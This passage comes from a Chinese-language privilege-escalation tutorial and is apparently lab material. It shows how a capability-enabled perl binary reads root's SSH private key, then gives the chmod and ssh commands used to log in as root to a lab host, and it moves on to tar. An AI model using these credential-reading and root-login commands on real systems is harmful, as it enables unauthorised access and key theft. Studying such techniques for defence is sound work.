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" width="826" height="175" class="img_ev3q"></p>
<p>该命令使用 LFILE 作为变量，然后将该变量传递给 perl 命令。我们不需要这样做...相反，我们只需将第二条命令中的 $LFILE 替换为我们要读取的文件的绝对路径，就能实现同样的目的。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/home/juggernaut/bin/perl -ne print &#x27;/root/.ssh/id_rsa&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164307222-442944099-59f0373d75a4187c85e1804a3ad4cd09.png" width="710" height="480" class="img_ev3q"></p>
<p>太棒了！就这样，我们发现我们能够转储 root 的 SSH 密钥！现在我们可以将此密钥复制到攻击者的机器上，然后以 root 身份通过 SSH 进入受害者！</p>
<p>复制整个密钥，然后将其粘贴到攻击者机器上的文本编辑器中。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164315806-759926152-6b82dcfffa5a4cbf27c9dc80cbea8c12.png" width="541" height="510" class="img_ev3q"></p>
<p>接下来，我们需要使用以下命令降低此文件的权限：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">chmod 600 ./root_id_rsa</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164305061-726881386-d2a893ce1e1cc63587d426450756c806.png" width="436" height="100" class="img_ev3q"></p>
<p>现在我们可以使用 id_rsa 在不提供密码的情况下通过 SSH 获取 root shell。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ssh -i ./root_id_rsa root@172.16.1.175</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164305198-1370454409-8f624c8cfe9109ed12b9935fcd151399.png" width="446" height="130" class="img_ev3q"></p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="313cap_dac_read_search--tar"><strong><div id="id3.1.3">3.1.3、cap_dac_read_search – tar</div></strong><a href="#313cap_dac_read_search--tar" class="hash-link" aria-label="313cap_dac_read_search--tar的直接链接" title="313cap_dac_read_search--tar的直接链接">​</a></h6>
<p>首先检查 GTFObins 上的文件读取功能。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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